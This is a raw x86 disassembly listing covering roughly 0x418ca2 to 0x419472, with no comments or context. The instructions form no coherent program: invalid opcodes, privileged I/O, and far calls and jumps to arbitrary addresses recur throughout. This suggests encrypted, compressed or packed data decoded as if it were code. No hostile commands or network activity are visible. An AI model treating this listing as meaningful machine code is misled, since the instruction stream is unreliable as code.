  418ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ca3:	push   es
  418ca4:	cmp    al,0x8c
  418ca6:	repz sbb BYTE PTR [edx],ch
  418ca9:	mov    ah,0xd7
  418cab:	add    dh,BYTE PTR [edi-0x50]
  418cae:	mov    eax,ss:0x23c0a5a9
  418cb4:	mov    ds,WORD PTR [edi+0x7f]
  418cb7:	lods   al,BYTE PTR ds:[esi]
  418cb8:	sub    eax,0xf1e2b58b
  418cbd:	daa    
  418cbe:	cmp    al,cl
  418cc0:	ret    
  418cc1:	imul   ebp,DWORD PTR [edx+ebx*4+0x7ffb0ac6],0x70
  418cc9:	mov    esp,0x89a5b8be
  418cce:	mov    ?,WORD PTR [eax+0x5c]
  418cd1:	les    ebp,FWORD PTR [edx]
  418cd3:	gs (bad) 
  418cd5:	xchg   ebp,eax
  418cd6:	bound  esi,QWORD PTR gs:[esi]
  418cd9:	out    0x90,eax
  418cdb:	leave  
  418cdc:	(bad)
  418ce0:	push   0xc1bf106c
  418ce5:	bound  ebp,QWORD PTR [ecx-0x62]
  418ce8:	dec    ebp
  418ce9:	xchg   DWORD PTR [edx],ecx
  418ceb:	cld    
  418cec:	or     al,0x9b
  418cee:	sar    ch,0x1f
  418cf1:	mov    bx,0xb9bf
  418cf5:	mov    esp,0xad0bf91f
  418cfa:	retf   
  418cfb:	pop    ecx
  418cfc:	inc    ebx
  418cfd:	fimul  DWORD PTR [edx+0x68fc6e70]
  418d03:	scas   al,BYTE PTR es:[edi]
  418d04:	int    0x63
  418d06:	lods   eax,DWORD PTR ds:[esi]
  418d07:	xor    DWORD PTR [ecx+0x45],0x457b6057
  418d0e:	add    DWORD PTR [ebp-0x3916f7c7],ecx
  418d14:	push   0x35590ec
  418d19:	sbb    edx,eax
  418d1b:	mov    ah,0xc
  418d1d:	jbe    0x418d53
  418d1f:	mov    edi,0x13af705c
  418d24:	call   0x335d:0xa7d77a61
  418d2b:	fdivr  QWORD PTR [esi+ecx*1-0x4eb69c9f]
  418d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d33:	fdivrp st(2),st
  418d35:	pusha  
  418d36:	mov    al,ds:0xe5f21e6c
  418d3b:	jle    0x418d2d
  418d3d:	push   ebx
  418d3e:	clc    
  418d3f:	sub    esi,DWORD PTR [edx]
  418d41:	pop    ebp
  418d42:	leave  
  418d43:	retf   0xca41
  418d46:	jecxz  0x418d0c
  418d48:	or     BYTE PTR [edi-0x2f6d8d1],bh
  418d4e:	and    al,0x71
  418d50:	or     dh,BYTE PTR [eax-0x24d906c2]
  418d56:	rcl    BYTE PTR [ebx-0x97a60b0],0x63
  418d5d:	cmp    bh,ch
  418d5f:	dec    edx
  418d60:	push   edx
  418d61:	ins    DWORD PTR es:[edi],dx
  418d62:	xor    DWORD PTR [ecx+edi*2],edx
  418d65:	into   
  418d66:	jne    0x418da1
  418d68:	mov    ds:0x2e7ca33,eax
  418d6d:	idiv   BYTE PTR [edx]
  418d6f:	xor    eax,0xfe612d2e
  418d74:	test   BYTE PTR [edx],bh
  418d76:	je     0x418dbc
  418d78:	leave  
  418d79:	(bad)  [ebx-0x3f]
  418d7c:	mov    dl,0x25
  418d7e:	iret   
  418d7f:	imul   esp,edx,0x9b46367c
  418d85:	dec    edx
  418d86:	mov    ch,0x2
  418d88:	mov    ch,0xca
  418d8a:	test   BYTE PTR [edx+0x7c24ef6d],al
  418d90:	jl     0x418d17
  418d92:	xchg   esi,eax
  418d93:	(bad)  
  418d94:	adc    dl,BYTE PTR [edi]
  418d96:	fisubr DWORD PTR [edx-0xba83310]
  418d9c:	imul   ebp,DWORD PTR [ebp-0xffb4e0b],0xffffff8d
  418da3:	xor    ch,0x63
  418da6:	arpl   WORD PTR [esi+0x6c],cx
  418da9:	add    ah,ch
  418dab:	mov    ebx,0xce125b7c
  418db0:	in     al,0x2a
  418db2:	xchg   ecx,eax
  418db3:	ins    DWORD PTR es:[edi],dx
  418db4:	push   es
  418db5:	int3   
  418db6:	mov    eax,ds:0x72009d84
  418dbb:	bound  ebx,QWORD PTR [edi+0x5786182]
  418dc1:	es hlt 
  418dc3:	rol    ch,cl
  418dc5:	lock jge 0x418deb
  418dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc9:	in     eax,0x9a
  418dcb:	push   esi
  418dcc:	lock push ebx
  418dce:	gs and eax,0xaa06e45b
  418dd4:	and    al,0x4c
  418dd6:	xor    al,bh
  418dd8:	mov    al,ds:0xc36c7ab4
  418ddd:	sbb    BYTE PTR [ebp-0x71],bh
  418de0:	repz aam 0xea
  418de3:	lds    esi,FWORD PTR [esi+0x3c6279bf]
  418de9:	cmp    al,0xe6
  418deb:	aaa    
  418dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ded:	mov    bh,0xd7
  418def:	hlt    
  418df0:	mov    esp,0x669ad75d
  418df5:	jl     0x418def
  418df7:	mov    eax,ds:0xf30c2b40
  418dfc:	es inc eax
  418dfe:	cmp    eax,0x2261c816
  418e03:	xor    eax,0x7f5fb8ba
  418e08:	sub    al,0x9
  418e0a:	cmp    al,BYTE PTR [edi+0x7f]
  418e0d:	xchg   edi,eax
  418e0e:	je     0x418e2a
  418e10:	outs   dx,BYTE PTR ds:[esi]
  418e11:	hlt    
  418e12:	pop    edx
  418e13:	lea    eax,[ebx]
  418e15:	ja     0x418d9e
  418e17:	outs   dx,BYTE PTR ds:[esi]
  418e18:	xchg   DWORD PTR [ebp+ecx*2-0x1f9a11ef],ebp
  418e1f:	in     al,dx
  418e20:	adc    al,dh
  418e22:	mov    dl,0x8a
  418e24:	shl    DWORD PTR [edx],cl
  418e26:	lds    ebx,FWORD PTR [eax+ebx*1]
  418e29:	jl     0x418e5c
  418e2b:	jno    0x418ea3
  418e2d:	out    dx,eax
  418e2e:	push   ds
  418e2f:	lea    esi,[ebp+ecx*8-0x57857efc]
  418e36:	(bad)  
  418e37:	retf   0x62c0
  418e3a:	inc    ax
  418e3c:	sbb    DWORD PTR [ecx],esi
  418e3e:	repz xchg si,ax
  418e41:	int3   
  418e42:	mov    cl,0xdf
  418e44:	xchg   BYTE PTR [edx],bl
  418e46:	inc    eax
  418e47:	(bad)  
  418e48:	lock xchg ebx,eax
  418e4a:	(bad)  
  418e4b:	in     eax,dx
  418e4c:	mov    es,WORD PTR ds:0x89ff8db5
  418e52:	mov    bh,0x3a
  418e54:	imul   edx,DWORD PTR [esi-0x29a988c4],0xb1431afc
  418e5e:	gs push ds
  418e60:	mov    esi,0x530e1e4
  418e65:	pop    ebx
  418e66:	and    eax,esp
  418e68:	loope  0x418ecb
  418e6a:	mov    ch,0xd1
  418e6c:	sub    al,0x36
  418e6e:	jg     0x418e7a
  418e70:	pop    esp
  418e71:	jmp    0x1206f06
  418e76:	cld    
  418e77:	out    0xe7,al
  418e79:	dec    edx
  418e7a:	in     al,dx
  418e7b:	mov    ebx,0xd793f4d4
  418e80:	adc    BYTE PTR [edx-0x797c7e6c],bh
  418e86:	xchg   esp,eax
  418e87:	cdq    
  418e88:	xchg   ebx,eax
  418e89:	lods   eax,DWORD PTR ds:[esi]
  418e8a:	in     eax,0x3f
  418e8c:	popf   
  418e8d:	sbb    eax,0x172fbba0
  418e92:	mov    al,0xf3
  418e94:	sub    bh,al
  418e96:	adc    eax,ecx
  418e98:	jnp    0x418efd
  418e9a:	mov    eax,ds:0x7876ae6c
  418e9f:	xchg   esp,eax
  418ea0:	xlat   BYTE PTR ds:[ebx]
  418ea1:	test   BYTE PTR [esi+0x758f32aa],ch
  418ea7:	dec    ecx
  418ea8:	jl     0x418efa
  418eaa:	jo     0x418e97
  418eac:	inc    ebx
  418ead:	ds popf 
  418eaf:	add    DWORD PTR [eax+0x51],esi
  418eb2:	rol    BYTE PTR [ebp-0x4353e3be],0xcc
  418eb9:	dec    esp
  418eba:	mov    ds:0xe3e967fc,eax
  418ebf:	stos   BYTE PTR es:[edi],al
  418ec0:	xor    cl,BYTE PTR [edi-0x61]
  418ec3:	push   ebx
  418ec4:	push   ebx
  418ec5:	test   al,0xa0
  418ec7:	daa    
  418ec8:	enter  0x71fb,0x50
  418ecc:	adc    ebp,DWORD PTR [edi+0x24]
  418ecf:	or     bl,BYTE PTR [ecx-0x7a]
  418ed2:	and    BYTE PTR [edx-0x33],ah
  418ed5:	xchg   edx,eax
  418ed6:	mov    cl,al
  418ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ed9:	add    eax,0xbc63d35b
  418ede:	stos   BYTE PTR es:[edi],al
  418edf:	imul   ecx,DWORD PTR [ebp-0x63],0x1d
  418ee3:	mov    bh,cl
  418ee5:	mov    DWORD PTR [edx-0x12],eax
  418ee8:	ret    0xde7b
  418eeb:	cld    
  418eec:	dec    edx
  418eed:	sbb    al,0x51
  418eef:	jbe    0x418e7a
  418ef1:	push   es
  418ef2:	mov    ah,0x22
  418ef4:	sub    ebx,DWORD PTR [esi-0x1]
  418ef7:	rcl    BYTE PTR [ebx],1
  418ef9:	test   BYTE PTR [ebp-0x59],ah
  418efc:	addr16 out dx,eax
  418efe:	push   ecx
  418eff:	sbb    ebp,esi
  418f01:	out    dx,al
  418f02:	aam    0xf3
  418f04:	adc    al,BYTE PTR [edi]
  418f06:	xchg   esp,eax
  418f07:	mov    edi,0xd167b9e0
  418f0c:	ins    BYTE PTR es:[edi],dx
  418f0d:	xor    esp,DWORD PTR [edx]
  418f0f:	add    eax,0x5c66ec21
  418f14:	hlt    
  418f15:	sub    eax,0xa32a4d5d
  418f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f1b:	not    DWORD PTR [ebx-0x520df6dd]
  418f21:	and    dl,bh
  418f23:	sub    al,0xf2
  418f25:	xchg   ebp,eax
  418f26:	(bad)
  418f2b:	jb     0x418fa8
  418f2d:	cmp    DWORD PTR ds:0x64ab5273,0x3
  418f34:	push   edx
  418f35:	stc    
  418f36:	retf   0x5127
  418f39:	push   ss
  418f3a:	xor    al,0x95
  418f3c:	or     BYTE PTR [ebp+0x4],dh
  418f3f:	cmp    eax,0x3e415e7d
  418f44:	jo     0x418f26
  418f46:	in     eax,dx
  418f47:	xchg   BYTE PTR [ecx+0x54],ch
  418f4a:	mov    edi,0x240447dd
  418f4f:	jecxz  0x418f22
  418f51:	xor    ebp,ebx
  418f53:	fwait
  418f54:	int    0xf
  418f56:	or     eax,0x235d1d7f
  418f5b:	ins    BYTE PTR es:[edi],dx
  418f5c:	xchg   ecx,eax
  418f5d:	dec    ebx
  418f5e:	xchg   edx,eax
  418f5f:	xor    DWORD PTR [ebp+0x21a30c39],0xfd351103
  418f69:	hlt    
  418f6a:	sub    dh,bl
  418f6c:	mov    cl,0x42
  418f6e:	outs   dx,BYTE PTR ds:[esi]
  418f6f:	or     edx,DWORD PTR [ebx+0x5fb80d66]
  418f75:	jnp    0x418f95
  418f77:	in     al,0x46
  418f79:	loopne 0x418f72
  418f7b:	out    dx,eax
  418f7c:	hlt    
  418f7d:	aas    
  418f7e:	xchg   ecx,eax
  418f7f:	adc    bh,BYTE PTR [edx-0x69e8b9f7]
  418f85:	ffreep st(4)
  418f87:	mov    es,WORD PTR [ecx]
  418f89:	ror    cl,cl
  418f8b:	out    0xf6,eax
  418f8d:	mov    ebp,0xb4b91240
  418f92:	sbb    esp,DWORD PTR [ebp+0x5850fafd]
  418f98:	call   0x29e1f618
  418f9d:	aaa    
  418f9e:	dec    edi
  418f9f:	and    DWORD PTR [eax+0x2d92bc27],esp
  418fa5:	or     al,0xd2
  418fa7:	mov    eax,0xac426f8f
  418fac:	push   esi
  418fad:	pop    esp
  418fae:	repz cmp esi,edi
  418fb1:	inc    esp
  418fb2:	mov    bh,0xfb
  418fb4:	mov    ds:0x73fc707d,eax
  418fba:	adc    ebx,ecx
  418fbc:	adc    ebx,DWORD PTR [esi-0x63]
  418fbf:	fdivr  st,st(3)
  418fc1:	add    ebx,edx
  418fc3:	outs   dx,DWORD PTR ds:[esi]
  418fc4:	ror    dl,1
  418fc6:	adc    al,0x43
  418fc8:	adc    BYTE PTR [edi+0x3c8e78a8],0xf6
  418fcf:	pop    es
  418fd0:	add    BYTE PTR [edx+0x3a6040a4],0xcf
  418fd7:	lods   al,BYTE PTR ds:[esi]
  418fd8:	outs   dx,BYTE PTR ds:[esi]
  418fd9:	retf   0x7f17
  418fdc:	xchg   ebx,eax
  418fdd:	pop    esp
  418fde:	jbe    0x41904b
  418fe0:	or     eax,0x2a7bfee
  418fe5:	and    esi,DWORD PTR [eax]
  418fe7:	into   
  418fe8:	sub    DWORD PTR [esi+0x621e3ca9],edx
  418fee:	dec    esp
  418fef:	jle    0x419039
  418ff1:	xchg   esp,eax
  418ff2:	les    ebx,FWORD PTR [edx-0x3617483f]
  418ff8:	loop   0x41906e
  418ffa:	repnz mov ds:0xda08ea7a,eax
  419000:	xchg   edi,eax
  419001:	imul   edx,DWORD PTR [edi+0x52],0x2a
  419005:	cmp    ebx,esp
  419007:	mov    cl,0xed
  41900a:	sub    eax,DWORD PTR [edx-0x3dfe3d46]
  419010:	stc    
  419011:	pop    esp
  419012:	pop    esi
  419013:	scas   eax,DWORD PTR es:[edi]
  419014:	(bad)  
  419015:	push   cs
  419016:	xchg   ebx,eax
  419017:	imul   ebp,DWORD PTR [edi-0x52e518d9],0x6bc25bdf
  419021:	repnz inc DWORD PTR [esi-0x48e05679]
  419028:	js     0x419073
  41902a:	ds cli 
  41902c:	jle    0x419073
  41902e:	sub    edx,esi
  419030:	out    0x28,eax
  419032:	jecxz  0x419005
  419034:	stos   BYTE PTR es:[edi],al
  419035:	inc    edi
  419036:	arpl   WORD PTR [esi-0x3c8f3999],sp
  41903c:	ds cwde 
  41903e:	mul    ah
  419040:	les    esp,FWORD PTR [eax-0x6f279b14]
  419046:	adc    eax,0x6f4d98df
  41904b:	add    DWORD PTR [ebx+0x1a],ebp
  41904e:	outs   dx,BYTE PTR ds:[esi]
  41904f:	cs gs pop ss
  419052:	leave  
  419053:	test   al,0x79
  419055:	push   eax
  419056:	icebp  
  419057:	nop
  419058:	ja     0x418fdc
  41905a:	lds    edx,FWORD PTR [edx+0x7a]
  41905d:	sub    dl,BYTE PTR [edx-0x6]
  419060:	adc    BYTE PTR [edx],ah
  419062:	pop    ecx
  419063:	mov    ds:0x27f926ed,al
  419068:	push   es
  419069:	(bad)  
  41906a:	xor    al,ah
  41906c:	xchg   esi,eax
  41906d:	jnp    0x4190b3
  41906f:	loop   0x4190d9
  419071:	dec    edx
  419072:	scas   eax,DWORD PTR es:[edi]
  419073:	loope  0x419025
  419075:	dec    edx
  419076:	(bad)  
  419077:	mov    edi,es
  419079:	xchg   esi,eax
  41907a:	fsub   st(3),st
  41907c:	dec    eax
  41907d:	ins    DWORD PTR es:[edi],dx
  41907e:	sub    DWORD PTR [esp+ebp*2-0x7fc003b9],edi
  419085:	or     al,cl
  419087:	inc    edx
  419088:	outs   dx,DWORD PTR ds:[esi]
  419089:	adc    DWORD PTR [eax],esp
  41908b:	push   DWORD PTR [ebx+edi*4-0x70e2128d]
  419092:	jg     0x419040
  419094:	imul   ebx,DWORD PTR [esi],0xb3515649
  41909a:	xchg   edx,eax
  41909b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41909c:	hlt    
  41909d:	jmp    0xeb07:0x579ecb2a
  4190a4:	xor    eax,0x80b52f58
  4190a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190aa:	mov    esi,0x5f22297b
  4190af:	pop    ds
  4190b0:	cmp    DWORD PTR [esi],0xd77468c0
  4190b6:	mov    eax,ds:0xd47dc5bf
  4190bb:	cmp    bl,BYTE PTR [ebp-0x47]
  4190be:	pop    ecx
  4190bf:	fwait
  4190c0:	imul   esp,edx,0x4ff0495b
  4190c6:	rcr    DWORD PTR [esi],0xf8
  4190c9:	mov    WORD PTR [edx+esi*4+0x4e],fs
  4190cd:	in     al,dx
  4190ce:	into   
  4190cf:	lahf   
  4190d0:	retf   
  4190d1:	sub    ecx,eax
  4190d3:	mov    dl,BYTE PTR [eax]
  4190d5:	sbb    DWORD PTR [ebx],ebx
  4190d7:	sub    eax,0xa9718eea
  4190dc:	xlat   BYTE PTR ds:[ebx]
  4190dd:	inc    edi
  4190de:	ds push 0x9dfc87f2
  4190e4:	cld    
  4190e5:	xlat   BYTE PTR ds:[ebx]
  4190e6:	mov    esi,0xf49f8281
  4190eb:	adc    al,0xae
  4190ed:	(bad)  
  4190ee:	or     BYTE PTR [edx+0x7d87b353],al
  4190f4:	loopne 0x419099
  4190f6:	mov    ds,WORD PTR [edx]
  4190f8:	jnp    0x41912e
  4190fa:	pop    edi
  4190fb:	sbb    eax,0xbebb924
  419100:	mov    edx,0x7e67a205
  419105:	mov    ds:0x3d6f877b,eax
  41910a:	scas   eax,DWORD PTR es:[edi]
  41910b:	push   ebp
  41910c:	jl     0x4190ce
  41910e:	inc    esp
  41910f:	lods   al,BYTE PTR ds:[esi]
  419110:	repz arpl WORD PTR [ecx+0x4c43c953],si
  419117:	adc    ecx,DWORD PTR [edi+ebx*1]
  41911a:	pusha  
  41911b:	fsub   QWORD PTR [edx+0x325c03e9]
  419121:	bound  esi,QWORD PTR [edx]
  419123:	push   0x9b925bd0
  419128:	add    DWORD PTR [ecx+0x11a827a2],ebp
  41912e:	nop
  41912f:	ret    0x8da8
  419132:	fdiv   DWORD PTR [ebp-0x4d]
  419135:	sar    BYTE PTR [ecx],1
  419137:	daa    
  419138:	fs add ecx,esp
  41913b:	call   0xc52c4401
  419140:	aam    0x41
  419142:	retf   0xf078
  419145:	test   DWORD PTR [edi-0x6a],esi
  419148:	sbb    al,0xc9
  41914a:	lods   eax,DWORD PTR ds:[esi]
  41914b:	outs   dx,BYTE PTR ds:[esi]
  41914c:	xchg   ebp,eax
  41914d:	call   0x427778a1
  419152:	int    0xc2
  419154:	daa    
  419155:	sub    dl,cl
  419157:	mov    BYTE PTR [ebx+eax*4+0x19],bl
  41915b:	jmp    0x572aac70
  419160:	mov    eax,ds:0xb94364c6
  419165:	sbb    DWORD PTR [ebp+0x227bf13c],edi
  41916b:	adc    eax,0xdc34894b
  419170:	bndldx (bad),[eax]
  419173:	pop    ebp
  419174:	lds    ebp,FWORD PTR [ecx+ebx*2+0x1]
  419178:	test   al,0x7b
  41917a:	ret    
  41917b:	or     eax,0xa30c0569
  419180:	loope  0x419190
  419182:	loopne 0x419163
  419184:	mov    ?,WORD PTR [ebx+0x5bb65277]
  41918a:	pop    esi
  41918b:	push   0xffffff9a
  41918d:	add    al,0x80
  41918f:	call   0xbb2ddf3b
  419194:	dec    ebx
  419195:	ficom  WORD PTR [ebx+0x7c]
  419198:	icebp  
  419199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41919a:	pop    ebx
  41919b:	in     al,dx
  41919c:	ds push 0xae6d627f
  4191a2:	in     eax,dx
  4191a3:	js     0x41914f
  4191a5:	fidivr WORD PTR [esi-0x32aaa12c]
  4191ab:	push   esi
  4191ac:	loope  0x419162
  4191ae:	xchg   ebp,eax
  4191af:	fimul  WORD PTR [eax-0x49b81d5b]
  4191b5:	(bad)  
  4191b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191b7:	out    0x9b,al
  4191b9:	mov    ds:0x450c70f2,al
  4191be:	icebp  
  4191bf:	scas   al,BYTE PTR es:[edi]
  4191c0:	push   edi
  4191c1:	test   eax,0x54661573
  4191c6:	pushf  
  4191c7:	pop    ebp
  4191c8:	jne    0x41919e
  4191ca:	lods   eax,DWORD PTR ds:[esi]
  4191cb:	stos   BYTE PTR es:[edi],al
  4191cc:	(bad)  
  4191cd:	sbb    DWORD PTR [eax],edx
  4191cf:	mov    esi,0xe56af7e7
  4191d4:	retf   0xe17d
  4191d7:	xchg   esi,eax
  4191d8:	sub    ebx,DWORD PTR [eax-0x27]
  4191db:	pusha  
  4191dc:	push   ebx
  4191dd:	or     dh,BYTE PTR [ebx+ebp*8]
  4191e0:	mov    esp,0x233bc39f
  4191e5:	in     al,dx
  4191e6:	pop    ds
  4191e7:	jge    0x4191f6
  4191e9:	bound  ebp,QWORD PTR [ecx-0x78aa53a6]
  4191ef:	(bad)  
  4191f0:	(bad)  
  4191f1:	aas    
  4191f2:	push   ss
  4191f3:	dec    esi
  4191f4:	not    BYTE PTR [eax]
  4191f6:	xchg   esi,eax
  4191f7:	cmp    ah,BYTE PTR [edx+ecx*2]
  4191fa:	dec    ebp
  4191fb:	shl    ah,1
  4191fd:	and    BYTE PTR [edi-0x7b294772],dl
  419203:	les    esp,FWORD PTR [eax+0x7e52a752]
  419209:	sar    eax,cl
  41920b:	icebp  
  41920c:	inc    edi
  41920d:	stos   BYTE PTR es:[edi],al
  41920e:	push   ebp
  41920f:	xor    eax,0xc48735a6
  419214:	xchg   ebp,eax
  419215:	and    dl,BYTE PTR [ebp-0x7845d93f]
  41921b:	repz fsubp st(0),st
  41921e:	inc    edx
  41921f:	cmp    BYTE PTR ds:0xc57883dc,0xf2
  419226:	lar    ecx,WORD PTR [edx-0x588cbae6]
  41922d:	cmp    ecx,eax
  41922f:	inc    esi
  419230:	and    ecx,DWORD PTR [ebp-0x33]
  419233:	popa   
  419234:	outs   dx,BYTE PTR ds:[esi]
  419235:	cs aam 0x1a
  419238:	stos   DWORD PTR es:[edi],eax
  419239:	and    al,al
  41923b:	popa   
  41923c:	adc    BYTE PTR [esi],0xe0
  41923f:	and    DWORD PTR [ebx],edi
  419241:	push   ss
  419242:	jnp    0x419218
  419244:	hlt    
  419245:	add    BYTE PTR [edx+0x5b30949],ah
  41924b:	pop    ebx
  41924c:	adc    BYTE PTR [ebx],ch
  41924e:	jge    0x4191ee
  419250:	mov    ch,0xfe
  419252:	push   cs
  419253:	fidiv  DWORD PTR [ecx]
  419255:	inc    edi
  419256:	rcl    edx,cl
  419258:	pop    DWORD PTR [ebx]
  41925a:	aaa    
  41925b:	xchg   ebp,eax
  41925c:	pop    ebx
  41925d:	mov    dh,0x58
  41925f:	fiadd  WORD PTR [ebx+0x4f793d38]
  419265:	and    BYTE PTR [ebx-0x7136e070],dl
  41926b:	mov    cl,BYTE PTR [ecx+0x61ea3e75]
  419271:	sbb    ch,BYTE PTR [edi]
  419273:	push   ecx
  419274:	push   eax
  419275:	xor    al,0x29
  419277:	rcl    BYTE PTR [esi+0x58],0xbb
  41927b:	imul   edi,DWORD PTR [edx+0x52aa8fa9],0x12c27630
  419285:	pop    ebx
  419286:	leave  
  419287:	fadd   QWORD PTR [eax]
  419289:	jp     0x41923f
  41928b:	adc    ch,BYTE PTR [esi-0x5828509e]
  419291:	and    al,0x82
  419293:	retf   
  419294:	inc    esi
  419295:	sti    
  419296:	stos   DWORD PTR es:[edi],eax
  419297:	and    ebp,edx
  419299:	aam    0x71
  41929b:	ja     0x419230
  41929d:	dec    eax
  41929e:	mov    ds:0x48607d34,eax
  4192a3:	call   0x7146:0xcdafb828
  4192aa:	cmp    eax,0x45b5251c
  4192af:	pop    eax
  4192b0:	test   eax,0xa90f9f5d
  4192b5:	inc    edx
  4192b6:	in     al,0x16
  4192b8:	pop    esp
  4192b9:	outs   dx,BYTE PTR ds:[esi]
  4192ba:	jbe    0x41927e
  4192bc:	(bad)  
  4192bd:	jae    0x41928b
  4192bf:	dec    esp
  4192c0:	fs stos DWORD PTR es:[edi],eax
  4192c2:	out    0xb5,eax
  4192c4:	shr    esi,cl
  4192c6:	pop    es
  4192c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c9:	push   ebp
  4192ca:	fsub   st(3),st
  4192cc:	sub    DWORD PTR [edx-0x2733ddb6],esp
  4192d2:	jle    0x419275
  4192d4:	pop    ds
  4192d5:	test   ebx,edx
  4192d7:	rol    DWORD PTR [eax],cl
  4192d9:	xlat   BYTE PTR ds:[ebx]
  4192da:	sbb    DWORD PTR [ebp+0x52],ebp
  4192dd:	adc    ecx,DWORD PTR [ecx-0x25]
  4192e0:	add    BYTE PTR [edi-0x50],cl
  4192e3:	ins    BYTE PTR es:[edi],dx
  4192e4:	ret    
  4192e5:	ja     0x419361
  4192e7:	clc    
  4192e8:	jecxz  0x4192af
  4192ea:	inc    ebp
  4192eb:	(bad)  
  4192ec:	xlat   BYTE PTR ds:[ebx]
  4192ed:	sub    ebx,DWORD PTR [edx]
  4192ef:	sahf   
  4192f0:	jle    0x4192eb
  4192f2:	cmp    al,0x9c
  4192f4:	jo     0x41927a
  4192f6:	xor    BYTE PTR [edx-0x7c],0xa3
  4192fa:	popa   
  4192fb:	cmp    edx,DWORD PTR [esi-0x22066afd]
  419301:	jmp    0x57a1:0x8f444bbb
  419308:	shl    BYTE PTR [ebx+0x6c199145],1
  41930e:	loopne 0x41929a
  419310:	inc    ebp
  419311:	xor    bh,0x5
  419314:	and    dh,BYTE PTR es:[edi-0x7]
  419318:	js     0x41934a
  41931a:	adc    BYTE PTR [ebx-0x3fd766eb],al
  419320:	data16 mov ch,0xa
  419323:	add    eax,ecx
  419325:	or     al,0xb2
  419327:	fwait
  419328:	mov    cl,0xeb
  41932a:	outs   dx,DWORD PTR ds:[esi]
  41932b:	adc    dh,BYTE PTR [ebx+0x24b52b9b]
  419331:	sub    ecx,DWORD PTR [esi]
  419333:	mov    edi,0xc112e1f8
  419338:	out    0xdc,al
  41933a:	ja     0x4192f7
  41933c:	push   edi
  41933e:	call   0x8ffbe043
  419343:	div    BYTE PTR [ebp-0x7c]
  419346:	retf   0xc453
  419349:	adc    DWORD PTR [ebx],0xffffffa8
  41934c:	push   eax
  41934d:	push   ds
  41934e:	and    eax,esi
  419350:	jle    0x4192e1
  419352:	loope  0x41934c
  419354:	add    eax,0x30b925ae
  419359:	mov    eax,0x8653e4a4
  41935e:	cwde   
  41935f:	xchg   esi,eax
  419360:	sbb    DWORD PTR [eax-0x2e567ea2],esi
  419366:	cmc    
  419367:	push   ebx
  419368:	pop    es
  419369:	push   edx
  41936a:	gs retf 
  41936c:	fxch   st(3)
  41936e:	inc    eax
  41936f:	jecxz  0x41936e
  419371:	xor    cl,ah
  419373:	mov    DWORD PTR [ebp+ecx*1-0x2b18c378],ebx
  41937a:	xor    BYTE PTR ds:0x17abe276,al
  419380:	mov    bl,0x1e
  419382:	cwde   
  419383:	jle    0x419354
  419385:	in     al,dx
  419386:	out    dx,al
  419387:	pop    edx
  419388:	call   FWORD PTR ds:0x1cf4fdc8
  41938e:	lea    ebx,[ebp+0x50]
  419391:	xchg   esi,eax
  419392:	ja     0x4193ca
  419394:	mov    ebp,DWORD PTR [edi]
  419396:	xlat   BYTE PTR ds:[ebx]
  419397:	jp     0x4193e0
  419399:	lea    ebx,[ebx+0x39182b95]
  41939f:	adc    DWORD PTR [ebx+0x61],ebp
  4193a2:	jns    0x419403
  4193a4:	out    0x6b,eax
  4193a6:	fsubr  DWORD PTR [ecx]
  4193a8:	fs inc ecx
  4193aa:	fisttp WORD PTR [esi+ebx*4]
  4193ad:	mov    WORD PTR [edx+0x71cb3b2f],fs
  4193b3:	push   ds
  4193b4:	mov    dh,0x4b
  4193b6:	shr    DWORD PTR [eax-0x3e],0xe
  4193ba:	jg     0x41941a
  4193bc:	inc    esp
  4193bd:	repz push edi
  4193bf:	cdq    
  4193c0:	out    dx,al
  4193c1:	xor    BYTE PTR [edx+esi*1+0x2],0xf3
  4193c6:	inc    ebx
  4193c7:	adc    cl,bh
  4193c9:	sub    eax,0x55bdbb38
  4193ce:	inc    edi
  4193cf:	jmp    0x41943f
  4193d1:	mov    al,ds:0xfccc3c91
  4193d6:	dec    edx
  4193d7:	sbb    BYTE PTR [ebp+0x55],0x43
  4193db:	fadd   DWORD PTR [edi+0x73df5606]
  4193e1:	adc    eax,esi
  4193e3:	das    
  4193e4:	jbe    0x41937a
  4193e6:	fbstp  TBYTE PTR [ebx]
  4193e8:	mov    ebp,0x328bfa8b
  4193ed:	in     eax,dx
  4193ee:	aad    0x7c
  4193f0:	or     dh,BYTE PTR [edi+0x163e76b]
  4193f6:	ja     0x4193da
  4193f8:	lods   al,BYTE PTR ds:[esi]
  4193f9:	jl     0x4193d6
  4193fb:	inc    ebx
  4193fc:	mov    ebx,0x549ecbc1
  419401:	adc    DWORD PTR [ebx-0x5],esp
  419404:	and    DWORD PTR [edi-0x49f4e723],eax
  41940a:	pop    DWORD PTR [esi+0x4d49f144]
  419410:	or     esi,DWORD PTR ds:0x4e733091
  419416:	retf   0x9886
  419419:	cmp    eax,0xf20bf88b
  41941e:	xor    DWORD PTR [ebx+0x5b],0xbbdb5222
  419425:	scas   eax,DWORD PTR es:[edi]
  419426:	pushf  
  419427:	test   al,0xed
  419429:	test   BYTE PTR [edx-0x3779c3f9],dh
  41942f:	(bad)  
  419430:	jecxz  0x41941a
  419432:	pop    es
  419433:	adc    BYTE PTR [edi],dh
  419435:	push   ebx
  419436:	mov    bl,0xdd
  419438:	out    dx,al
  419439:	xor    eax,0x73aad094
  41943e:	xor    eax,0xd4a45346
  419443:	push   ecx
  419444:	cmp    eax,0x891dccf0
  419449:	popf   
  41944a:	aaa    
  41944b:	sub    bl,ch
  41944d:	cmp    eax,ebp
  41944f:	in     eax,dx
  419450:	imul   edx,DWORD PTR [eax],0xf0e67f64
  419456:	and    eax,0x6f1eb622
  41945b:	push   edx
  41945c:	add    ebp,ecx
  41945e:	sub    eax,esi
  419460:	mov    bh,0xa0
  419462:	xor    BYTE PTR [edx+eax*8+0x1c],0x73
  419467:	inc    esi
  419468:	dec    edx
  419469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41946a:	gs in  eax,0xed
  41946d:	jl     0x41942d
  41946f:	test   dh,0x73
  419472:	ss inc esi
